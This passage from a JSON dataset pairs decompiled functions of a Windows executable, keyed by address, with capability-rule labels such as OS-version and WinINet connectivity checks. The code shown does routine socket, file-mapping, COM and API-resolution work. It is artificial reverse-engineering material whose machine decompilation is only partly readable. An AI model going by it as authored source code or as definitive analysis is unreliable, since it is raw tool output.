+ 1;\n                iVar1 = iVar1 + -1;\n            } while (iVar1 != 0);\n        }\n    }\n    else {\n        iVar2 = 0;\n        if (-1 < iVar1) {\n            iVar1 = iVar1 + 1;\n            do {\n                if ((*(*arg_1ch + iVar2 * 0x10) & 0x4000) == 0x4000) {\n                    fcn.00411a68();\n                }\n                iVar2 = iVar2 + 1;\n                iVar1 = iVar1 + -1;\n            } while (iVar1 != 0);\n        }\n    }\n    fcn.00406928(0);\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x45e6cd;\n    uStack40 = 0x45e6c5;\n    fcn.00406934();\n    return;\n}\n",
        "token_count": 640
    },
    "0045e90c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuchar fcn.0045e90c(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x44) != 0) {\n        return 3;\n    }\n    return *(in_EAX + 0x48);\n}\n",
        "token_count": 59
    },
    "0045f5f8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045f5f8(uint param_1, uint *param_2)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack244;\n    uint uStack240;\n    uchar *puStack236;\n    int32_t iStack232;\n    int32_t iStack228;\n    uint uStack224;\n    uint uStack220;\n    uint uStack216;\n    int32_t iStack212;\n    uint uStack208;\n    uchar *puStack204;\n    int32_t iStack200;\n    int32_t iStack196;\n    uint uStack192;\n    uint uStack188;\n    uint uStack184;\n    uint uStack180;\n    int32_t iStack176;\n    uint uStack172;\n    uchar *puStack168;\n    uint uStack164;\n    uint uStack160;\n    uint uStack156;\n    uint uStack152;\n    uint uStack148;\n    uint uStack144;\n    uint uStack140;\n    uint var_78h;\n    uint uStack120;\n    uint uStack116;\n    uint uStack112;\n    uint var_68h;\n    uint lpBaseAddress;\n    uint hFileMappingObject;\n    uint hObject;\n    uint var_4h;\n    \n    uStack140 = 0x45f60d;\n    cVar1 = fcn.0040a26c();\n    if (cVar1 != '\\0') {\n        uStack140 = 0x45f61d;\n        fcn.0045eb30();\n        uStack140 = 0;\n        uStack144 = 0x8000080;\n        uStack148 = 3;\n        uStack152 = 0;\n        uStack156 = 3;\n        uStack160 = 0x80000000;\n        uStack164 = 0x45f636;\n        uStack164 = fcn.004059dc();\n        puStack168 = 0x45f63c;\n        iVar2 = sub.kernel32.dll_CreateFileA_1();\n        if (iVar2 != -1) {\n            uStack172 = 0x45f718;\n            iStack176 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffff50;\n            uStack180 = 0;\n            uStack184 = 0;\n            uStack188 = 0;\n            uStack192 = 2;\n            iStack196 = 0;\n            puStack204 = 0x45f66a;\n            iStack200 = iVar2;\n            puStack168 = &stack0xfffffffc;\n            iVar3 = sub.kernel32.dll_CreateFileMappingA();\n            if (iVar3 == 0) {\n                *in_FS_OFFSET = iStack200;\n                uStack192 = 0x45f71f;\n                iStack200 = 0x45f717;\n                iStack196 = iVar2;\n                sub.kernel32.dll_CloseHandle_1();\n                return;\n            }\n            uStack208 = 0x45f6fa;\n            iStack212 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffff2c;\n            uStack216 = 0;\n            uStack220 = 0;\n            uStack224 = 0;\n            iStack228 = 4;\n            puStack236 = 0x45f696;\n            iStack232 = iVar3;\n            puStack204 = &stack0xfffffffc;\n            iVar4 = sub.kernel32.dll_MapViewOfFile();\n            if (iVar4 != 0) {\n                uStack240 = 0x45f6dc;\n                iStack244 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffff0c;\n                puStack236 = &stack0xfffffffc;\n                sub.kernel32.dll_GetFileSize_1(iVar2, 0);\n                fcn.0045eb54();\n                *in_FS_OFFSET = iVar2;\n                iStack244 = 0x45f6e3;\n                sub.kernel32.dll_UnmapViewOfFile(iVar4);\n                return;\n            }\n            *in_FS_OFFSET = iStack232;\n            uStack224 = 0x45f701;\n            iStack232 = 0x45f6f9;\n            iStack228 = iVar3;\n            sub.kernel32.dll_CloseHandle_1();\n            return;\n        }\n        puStack168 = 0x45f72a;\n        fcn.0045ebe8();\n        *param_2 = var_78h;\n        param_2[1] = uStack120;\n        param_2[2] = uStack116;\n        param_2[3] = uStack112;\n    }\n    return;\n}\n",
        "token_count": 1030
    },
    "0045fc5c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045fc5c(void)\n\n{\n    uchar *puVar1;\n    uint *in_FS_OFFSET;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    uchar *puStack8;\n    \n    puStack8 = &stack0xfffffffc;\n    uStack12 = 0x45fced;\n    uStack16 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack16;\n    *0x499cfc = *0x499cfc + 1;\n    if (*0x499cfc == 0) {\n        puVar1 = &stack0xfffffffc;\n        if (*0x4928d4 != 0) {\n            fcn.00404650();\n            puVar1 = puStack8;\n        }\n        puStack8 = puVar1;\n        if (*0x4928d8 != 0) {\n            fcn.00404650();\n        }\n        if (*0x4928dc != 0) {\n            fcn.00404650();\n        }\n        if (*0x4928e0 != 0) {\n            fcn.00404650();\n        }\n        if (*0x4928e4 != 0) {\n            fcn.00404650();\n        }\n        uStack20 = *0x499cf8;\n        sub.gdiplus.dll_GdiplusShutdown();\n    }\n    *in_FS_OFFSET = uStack20;\n    return;\n}\n",
        "token_count": 315
    },
    "0045fcf8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0045fd44)\n// WARNING: Removing unreachable block (ram,0x0045fd52)\n// WARNING: Removing unreachable block (ram,0x0045fd6a)\n// WARNING: Removing unreachable block (ram,0x0045fd86)\n// WARNING: Removing unreachable block (ram,0x0045fd9c)\n// WARNING: Removing unreachable block (ram,0x0045fda0)\n\nvoid fcn.0045fcf8(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack44 = 0x45fd14;\n    fcn.004059cc();\n    uStack48 = 0x45fdc8;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    puStack44 = &stack0xfffffffc;\n    fcn.0045f9ec();\n    *in_FS_OFFSET = uStack52;\n    puStack44 = 0x45fdcf;\n    uStack48 = 0x45fdbf;\n    fcn.00405530();\n    uStack48 = 0x45fdc7;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 320
    },
    "0046044c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0046044c(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint uStack24;\n    uint uStack20;\n    uint32_t uStack16;\n    \n    if (*(in_EAX + 0xc) == '\\0') {\n        uStack16 = *(in_EAX + 0x3e);\n        uStack20 = *(*(in_EAX + 0x11) * 4 + 0x492948);\n        uStack24 = *(*(in_EAX + 0xf) * 4 + 0x4928e8);\n        sub.wsock32.dll_socket();\n        iVar1 = (**(*in_EAX + 0x38))();\n        in_EAX[0x10] = iVar1;\n        *(in_EAX + 0xc) = iVar1 != -1;\n        if (iVar1 != -1) {\n            if (*(in_EAX + 0x31) == '\\x01') {\n                uStack24 = 1;\n                sub.wsock32.dll_ioctlsocket(in_EAX[0x10], 0x8004667e, &uStack24);\n                (**(*in_EAX + 0x38))();\n            }\n            in_EAX[0xd] = 0;\n            in_EAX[0xe] = 0;\n            fcn.0040484c();\n        }\n    }\n    return;\n}\n",
        "token_count": 309
    },
    "004604d0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004604d0(void)\n\n{\n    int32_t *in_EAX;\n    \n    if (*(in_EAX + 0xc) != '\\0') {\n        sub.wsock32.dll_closesocket(in_EAX[0x10]);\n        (**(*in_EAX + 0x38))();\n        in_EAX[0x10] = -1;\n        *(in_EAX + 0xc) = 0;\n        fcn.0040484c();\n    }\n    return;\n}\n",
        "token_count": 110
    },
    "00460ac0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00460ac0(void)\n\n{\n    if (*0x499e94 == 0) {\n        *0x499e94 = sub.kernel32.dll_GetModuleHandleA_2(0x460c1c);\n        if (*0x499e94 != 0) {\n            *0x499e98 = sub.kernel32.dll_GetProcAddress_1(*0x499e94, 0x460c2c);\n            *0x499e9c = sub.kernel32.dll_GetProcAddress_1(*0x499e94, 0x460c48);\n            *0x499ea0 = sub.kernel32.dll_GetProcAddress_1(*0x499e94, 0x460c58);\n            *0x499ea4 = sub.kernel32.dll_GetProcAddress_1(*0x499e94, 0x460c68);\n            *0x499ea8 = sub.kernel32.dll_GetProcAddress_1(*0x499e94, 0x460c74);\n            *0x499eac = sub.kernel32.dll_GetProcAddress_1(*0x499e94, 0x460c80);\n            *0x499eb0 = sub.kernel32.dll_GetProcAddress_1(*0x499e94, 0x460c9c);\n            *0x499eb4 = sub.kernel32.dll_GetProcAddress_1(*0x499e94, 0x460cac);\n            *0x499eb8 = sub.kernel32.dll_GetProcAddress_1(*0x499e94, 0x460cbc);\n            *0x499ebc = sub.kernel32.dll_GetProcAddress_1(*0x499e94, 0x460ccc);\n            *0x499ec0 = sub.kernel32.dll_GetProcAddress_1(*0x499e94, 0x460cdc);\n            *0x499ec4 = sub.kernel32.dll_GetProcAddress_1(*0x499e94, 0x460cec);\n            *0x499ec8 = sub.kernel32.dll_GetProcAddress_1(*0x499e94, 0x460cfc);\n            *0x499ecc = sub.kernel32.dll_GetProcAddress_1(*0x499e94, 0x460d0c);\n            *0x499ed0 = sub.kernel32.dll_GetProcAddress_1(*0x499e94, 0x460d1c);\n            *0x499ed4 = sub.kernel32.dll_GetProcAddress_1(*0x499e94, 0x460d2c);\n        }\n    }\n    if ((*0x499e94 != 0) && (*0x499e98 != 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 585
    },
    "00460ddc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00460ddc(void)\n\n{\n    if (*0x499ed8 == 0) {\n        *0x499ed8 = sub.kernel32.dll_LoadLibraryA(0x460fa8);\n        if (*0x499ed8 < 0x20) {\n            *0x499ed8 = 0;\n            return 0;\n        }\n        *0x499edc = sub.kernel32.dll_GetProcAddress_1(*0x499ed8, 0x460fb4);\n        *0x499ee0 = sub.kernel32.dll_GetProcAddress_1(*0x499ed8, 0x460fc4);\n        *0x499ee4 = sub.kernel32.dll_GetProcAddress_1(*0x499ed8, 0x460fd8);\n        *0x499ee8 = sub.kernel32.dll_GetProcAddress_1(*0x499ed8, 0x460fec);\n        *0x499eec = sub.kernel32.dll_GetProcAddress_1(*0x499ed8, 0x460fd8);\n        *0x499ef0 = sub.kernel32.dll_GetProcAddress_1(*0x499ed8, 0x460fec);\n        *0x499ef4 = sub.kernel32.dll_GetProcAddress_1(*0x499ed8, 0x461004);\n        *0x499ef8 = sub.kernel32.dll_GetProcAddress_1(*0x499ed8, 0x461018);\n        *0x499efc = sub.kernel32.dll_GetProcAddress_1(*0x499ed8, 0x461030);\n        *0x499f00 = sub.kernel32.dll_GetProcAddress_1(*0x499ed8, 0x461048);\n        *0x499f04 = sub.kernel32.dll_GetProcAddress_1(*0x499ed8, 0x461058);\n        *0x499f08 = sub.kernel32.dll_GetProcAddress_1(*0x499ed8, 0x461068);\n        *0x499f0c = sub.kernel32.dll_GetProcAddress_1(*0x499ed8, 0x461084);\n        *0x499f10 = sub.kernel32.dll_GetProcAddress_1(*0x499ed8, 0x461098);\n        *0x499f14 = sub.kernel32.dll_GetProcAddress_1(*0x499ed8, 0x4610b4);\n        *0x499f18 = sub.kernel32.dll_GetProcAddress_1(*0x499ed8, 0x461084);\n        *0x499f1c = sub.kernel32.dll_GetProcAddress_1(*0x499ed8, 0x461098);\n        *0x499f20 = sub.kernel32.dll_GetProcAddress_1(*0x499ed8, 0x4610b4);\n        *0x499f24 = sub.kernel32.dll_GetProcAddress_1(*0x499ed8, 0x4610d0);\n        *0x499f28 = sub.kernel32.dll_GetProcAddress_1(*0x499ed8, 0x4610e4);\n        *0x499f2c = sub.kernel32.dll_GetProcAddress_1(*0x499ed8, 0x461100);\n        *0x499f30 = sub.kernel32.dll_GetProcAddress_1(*0x499ed8, 0x46111c);\n        *0x499f34 = sub.kernel32.dll_GetProcAddress_1(*0x499ed8, 0x461130);\n    }\n    return 1;\n}\n",
        "token_count": 770
    },
    "00461d10": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00461d10(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    bool bVar2;\n    uint uStack404;\n    uint uStack400;\n    uchar *puStack396;\n    uint uStack392;\n    uint uStack388;\n    uchar *puStack384;\n    uint var_178h;\n    uint var_174h;\n    uint var_170h;\n    int32_t var_16ch;\n    uint var_168h;\n    uint var_158h;\n    uint var_154h;\n    uint var_8h;\n    uint var_4h;\n    \n    var_178h = 0;\n    var_174h = 0;\n    var_170h = 0;\n    var_4h = 0;\n    var_8h = 0;\n    puStack384 = 0x461d4a;\n    var_16ch = in_EAX;\n    fcn.00405fe8();\n    uStack388 = 0x461f3b;\n    uStack392 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffe78;\n    if (*(var_16ch + 0xd) == '\\0') {\n        puStack396 = 0x461d79;\n        puStack384 = &stack0xfffffffc;\n        fcn.0040e830();\n        puStack396 = 0x461d84;\n        fcn.004055c8();\n        puStack396 = 0x461d9b;\n        fcn.00405864();\n        puStack396 = 0x461db1;\n        iVar1 = fcn.0040a488();\n        if (iVar1 == 0) {\n            uStack400 = 0x461e1f;\n            uStack404 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xfffffe6c;\n            puStack396 = &stack0xfffffffc;\n            do {\n                fcn.00405864();\n                (**(**(var_16ch + 0x4c) + 0x38))();\n                iVar1 = fcn.0040a4d8();\n                if (iVar1 != 0) break;\n            } while (*(var_16ch + 0xd) == '\\0');\n            *in_FS_OFFSET = uStack404;\n            puStack396 = 0x461e26;\n            uStack400 = 0x461e1e;\n            fcn.0040a4fc();\n            return;\n        }\n        if (*(var_16ch + 0x48) != '\\0') {\n            puStack396 = 0x461e49;\n            fcn.00405864();\n            puStack396 = 0x461e5f;\n            iVar1 = fcn.0040a488();\n            if (iVar1 == 0) {\n                uStack400 = 0x461ef8;\n                uStack404 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xfffffe6c;\n                puStack396 = &stack0xfffffffc;\n                do {\n                    bVar2 = (var_158h & 0x10) == 0;\n                    if (!bVar2) {\n                        fcn.00405974();\n                        if (!bVar2) {\n                            fcn.00405974();\n                            if (!bVar2) {\n                                fcn.00405864();\n                                fcn.00461d10();\n                            }\n                        }\n                    }\n                    iVar1 = fcn.0040a4d8();\n                } while ((iVar1 == 0) && (*(var_16ch + 0xd) == '\\0'));\n                *in_FS_OFFSET = uStack404;\n                puStack396 = 0x461eff;\n                uStack400 = 0x461ef7;\n                fcn.0040a4fc();\n                return;\n            }\n        }\n    }\n    *in_FS_OFFSET = uStack392;\n    puStack384 = 0x461f42;\n    uStack388 = 0x461f1c;\n    fcn.00405554();\n    uStack388 = 0x461f2d;\n    fcn.004060ac();\n    uStack388 = 0x461f3a;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 951
    },
    "00462ad0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00462ad0(int32_t arg_8h, uint noname_1, uint noname_2, int32_t *arg_14h)\n\n{\n    int32_t **in_FS_OFFSET;\n    int32_t *piStack32;\n    int32_t *piStack28;\n    int32_t iStack24;\n    uchar *puStack20;\n    uchar *var_8h;\n    int32_t var_4h;\n    \n    puStack20 = 0x462ae2;\n    fcn.00407080();\n    iStack24 = 0x462b58;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    piStack32 = arg_14h;\n    puStack20 = &stack0xfffffffc;\n    var_4h = (**(*arg_14h + 0x10))();\n    if (0 < var_4h) {\n        (**(*arg_14h + 0xc))(arg_14h, &fcn.00462ad0::var_8h);\n        if (*(arg_8h + 8) == 0) {\n            puStack20 = var_8h;\n            iStack24 = var_4h;\n            piStack28 = 0x402;\n            piStack32 = *(**0x494b04 + 4);\n            sub.user32.dll_SendMessageA();\n        }\n        else {\n            puStack20 = 0x462b40;\n            (**(arg_8h + 8))();\n        }\n    }\n    *in_FS_OFFSET = piStack32;\n    iStack24 = 0x462b5f;\n    piStack28 = 0x462b57;\n    fcn.0040700c();\n    return;\n}\n",
        "token_count": 389
    },
    "00462b68": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00462b68(int32_t arg_8h, uint noname_1, uint noname_2, uint arg_14h, int32_t arg_18h)\n\n{\n    if (0 < arg_18h) {\n        if (*(arg_8h + 8) == 0) {\n            sub.user32.dll_SendMessageA(*(**0x494b04 + 4), 0x402, arg_18h, arg_14h);\n        }\n        else {\n            (**(arg_8h + 8))();\n        }\n    }\n    return 0;\n}\n",
        "token_count": 134
    },
    "004629c0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00462a7e)\n// WARNING: Removing unreachable block (ram,0x00462a8a)\n// WARNING: Removing unreachable block (ram,0x00462a80)\n\nvoid fcn.004629c0(void)\n\n{\n    uchar *puVar1;\n    int32_t **in_EAX;\n    int32_t *piVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    uint *in_FS_OFFSET;\n    uint uVar5;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack36 = &stack0xfffffffc;\n    uStack40 = 0x462abe;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puVar1 = &stack0xfffffffc;\n    if (*in_EAX == NULL) {\n        puStack48 = 0x4629f4;\n        piVar2 = fcn.00404620();\n        *in_EAX = piVar2;\n        puVar1 = puStack36;\n    }\n    puStack36 = puVar1;\n    uStack52 = 0x462a15;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    puStack48 = &stack0xfffffffc;\n    (**(**in_EAX + 0x44))();\n    *in_FS_OFFSET = uStack56;\n    puStack48 = 0x462a2e;\n    puStack48 = fcn.0040700c();\n    uStack52 = *0x4949e8;\n    uStack56 = 1;\n    uVar5 = *0x494ab4;\n    uVar3 = sub.ole32.dll_CoCreateInstance(*0x494ab4, 0);\n    if ((uVar3 & 0x80000000) == 0) {\n        fcn.0040700c();\n        uVar4 = fcn.0040700c(0);\n        (**(_pe_dos_header + 0xc))(0, *0x494c64, uVar4);\n    }\n    *in_FS_OFFSET = uVar5;\n    uStack56 = 0x462ac5;\n    fcn.00405530();\n    fcn.0040700c();\n    fcn.0040700c();\n    return;\n}\n",
        "token_count": 569
    },
    "00462c84": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00462c84(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint32_t uVar2;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffff5c;\n    uint uStack104;\n    uint uStack100;\n    uchar *puStack96;\n    uint var_49h;\n    uint uStack72;\n    uint uStack68;\n    uint uStack64;\n    uint var_38h;\n    uint uStack56;\n    uint uStack52;\n    uint uStack48;\n    \n    puStack96 = 0x462ca2;\n    var_49h._0_1_ = param_2;\n    fcn.00405fe8();\n    uStack100 = 0x462eb6;\n    uStack104 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff98;\n    puStack96 = &stack0xfffffffc;\n    uVar1 = fcn.0040700c();\n    uVar2 = sub.ole32.dll_CoCreateInstance(*0x494ae8, 0, 3, *0x494ca8, uVar1);\n    if ((uVar2 & 0x80000000) == 0) {\n        uVar1 = fcn.0040700c();\n        uVar2 = sub.ole32.dll_CoCreateInstance(*0x4948fc, 0, 1, 0x462ec8, uVar1);\n        if ((uVar2 & 0x80000000) == 0) {\n            uVar1 = fcn.0040700c();\n            in_stack_ffffff5c = *0x494a1c;\n            uVar2 = sub.ole32.dll_CoCreateInstance(*0x494a1c, 0, 1, *0x4947f4, uVar1);\n            if ((uVar2 & 0x80000000) == 0) {\n                uVar1 = fcn.0040700c();\n                uVar2 = (****(in_EAX + 0x24))(*(in_EAX + 0x24), *0x494bd8, uVar1);\n                if ((uVar2 & 0x80000000) == 0) {\n                    (**(**(in_EAX + 0x34) + 0x18))(*(in_EAX + 0x34), 0);\n                    if (var_49h != '\\0') {\n                        fcn.00403af4();\n                        unique0x00006400 = **0x494bec;\n                        uStack72 = (*0x494bec)[1];\n                        uStack68 = (*0x494bec)[2];\n                        uStack64 = (*0x494bec)[3];\n                        var_38h = **0x494b20;\n                        uStack56 = (*0x494b20)[1];\n                        uStack52 = (*0x494b20)[2];\n                        uStack48 = (*0x494b20)[3];\n                        uVar2 = (**(**(in_EAX + 0x34) + 0x10))(*(in_EAX + 0x34), &fcn.00462c84::var_49h + 1);\n                        if ((uVar2 & 0x80000000) != 0) goto code_r0x00462e9a;\n                    }\n                    if (*(in_EAX + 0x3c) == 0) {\n                        uVar1 = fcn.00404620();\n                        *(in_EAX + 0x3c) = uVar1;\n                        uVar1 = fcn.00404620();\n                        *(*(in_EAX + 0x3c) + 0xc) = uVar1;\n                        fcn.00407024();\n                    }\n                    (**(**(in_EAX + 0x34) + 0x24))(*(in_EAX + 0x34), *(in_EAX + 0x40), param_1);\n                    uVar1 = fcn.0040700c();\n                    in_stack_ffffff5c = *0x494a70;\n                    uVar2 = sub.ole32.dll_CoCreateInstance(*0x494a70, 0, 3, *0x4947e4, uVar1);\n                    if ((uVar2 & 0x80000000) == 0) {\n                        uVar1 = fcn.0040700c();\n                        uVar2 = (****(in_EAX + 0x14))(*(in_EAX + 0x14), *0x494844, uVar1);\n                        if ((uVar2 & 0x80000000) == 0) {\n                            uVar1 = fcn.0040700c();\n                            uVar2 = (****(in_EAX + 0x14))(*(in_EAX + 0x14), *0x494c30, uVar1);\n                            if ((uVar2 & 0x80000000) == 0) {\n                                uVar1 = fcn.0040700c();\n                                uVar2 = (****(in_EAX + 0x14))(*(in_EAX + 0x14), *0x4948ac, uVar1);\n                                if ((uVar2 & 0x80000000) == 0) {\n                                    (**(**(in_EAX + 0x10) + 0x34))(*(in_EAX + 0x10), *(in_EAX + 4), 0x8001, 0);\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }\ncode_r0x00462e9a:\n    *in_FS_OFFSET = in_stack_ffffff5c;\n    fcn.004060ac(0x462ebd);\n    return;\n}\n",
        "token_count": 1293
    },
    "004630c8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004631a6)\n// WARNING: Removing unreachable block (ram,0x004631aa)\n// WARNING: Removing unreachable block (ram,0x004631ef)\n\nvoid __cdecl fcn.004630c8(int32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t in_EDX;\n    uint *in_FS_OFFSET;\n    uint uStack80;\n    uint uStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint var_20h;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack52 = 0x4630ea;\n    fcn.004059cc();\n    uStack56 = 0x463223;\n    uStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    puStack52 = &stack0xfffffffc;\n    fcn.00405530();\n    fcn.00409b7c();\n    fcn.004055c8();\n    if (in_EDX == 0) {\n        fcn.004055c8();\n    }\n    if (arg_8h != 0) {\n        fcn.0040700c();\n        uStack80 = *0x494ab4;\n        uVar1 = sub.ole32.dll_CoCreateInstance();\n        if ((uVar1 & 0x80000000) == 0) {\n            fcn.0040700c();\n            fcn.0040700c();\n            (**(_pe_dos_header + 0xc))(0);\n        }\n    }\n    *in_FS_OFFSET = uStack80;\n    fcn.00405530();\n    fcn.0040700c();\n    fcn.00405530();\n    fcn.0040700c();\n    return;\n}\n",
        "token_count": 427
    },
    "00463244": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00463244(void)\n\n{\n    int32_t in_EAX;\n    uint uStack20;\n    uint uStack16;\n    \n    if (*(in_EAX + 8) != 0) {\n        sub.user32.dll_GetClientRect(*(in_EAX + 4), &uStack20);\n        (**(**(in_EAX + 8) + 0x9c))(*(in_EAX + 8), 0, 0, uStack20, uStack16);\n    }\n    return;\n}\n",
        "token_count": 113
    },
    "004632c4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
